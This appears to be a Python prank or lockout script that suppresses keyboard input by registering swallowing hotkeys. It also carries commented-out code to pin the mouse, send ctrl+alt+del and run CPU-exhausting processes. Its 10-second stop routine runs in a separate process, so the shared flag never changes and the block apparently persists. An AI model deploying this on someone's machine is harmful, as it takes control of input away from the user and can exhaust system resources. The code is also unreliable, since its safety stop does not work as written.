import mouse
import time
import keyboard
import multiprocessing

executing = True

def move_mouse():
    while executing:
        mouse.move(0,0, absolute=True, duration=0)

def block_keyboard():
    for i in range(200):
        try: 
            keyboard.add_hotkey(str(i), print, suppress=True)
        except:
            pass
    while executing:
        #keyboard.send('ctrl+alt+del')
        pass

def stop():
    global executing
    time.sleep(10)
    keyboard.remove_all_hotkeys()
    executing = False

def cruncher():
    while executing:
        print(9846546**449546)
        
def start_block():
    #p1 = multiprocessing.Process(target=move_mouse)
    p2 = multiprocessing.Process(target=block_keyboard)
    p3 = multiprocessing.Process(target=stop)
    #p1.start()
    p2.start()
    p3.start()

if __name__ == '__main__':
    start_block()
    for i in range(16):
        #multiprocessing.Process(target=cruncher).start()
        pass